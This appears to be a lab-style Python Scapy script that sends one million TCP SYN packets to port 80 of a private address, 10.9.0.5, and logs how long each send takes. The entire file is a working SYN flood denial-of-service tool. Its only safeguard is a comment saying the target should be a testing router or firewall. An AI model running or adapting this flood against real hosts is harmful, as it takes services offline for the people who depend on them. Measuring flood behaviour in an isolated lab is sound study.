from datetime import datetime
from scapy.all import *


# target IP address (should be a testing router/firewall)
target_ip = "10.9.0.5"
# the target port u want to flood
target_port = 80
# number of packets to send in each iteration
packets_per_iter =  10000
num_iter_loop =  100

ip = IP(dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

# stack up the layers
p = ip / tcp

count = 0
# open file for writing syns_results_p.txt
with open("syns_results_p.txt", "w") as f:
    start_time = datetime.now()  # record the start time of sending packets
    try:
        for j in range(num_iter_loop):
            for i in range(packets_per_iter):
                # construct the packet
                packet = p / f"Packet {j*num_iter_loop + i+1}"
                send_time = datetime.now()  # record the time before sending the packet
                send(packet, verbose=0)
                count += 1
                if count % 50000 == 0:
                    print("send {} packets".format(count))
                time_diff = datetime.now() - send_time  # calculate the time it took to send the packet
                f.write(f"{count} {time_diff.total_seconds()}\n")  # write the index and time to the file
    except KeyboardInterrupt:
        # If the user enters Ctrl+C, break out of the loop
        pass
    end_time = datetime.now()  # record the end time of sending packets
    total_time = end_time - start_time  # calculate the total time to send all packets
    avg_time = total_time.total_seconds() / (packets_per_iter * num_iter_loop)  # calculate the average time per packet
    f.write(f"Total time: {total_time.total_seconds()/60} minutes\n")
    f.write(f"Average time per packet: {avg_time} seconds")

print("Sent a total of {} packets".format(packets_per_iter * num_iter_loop))
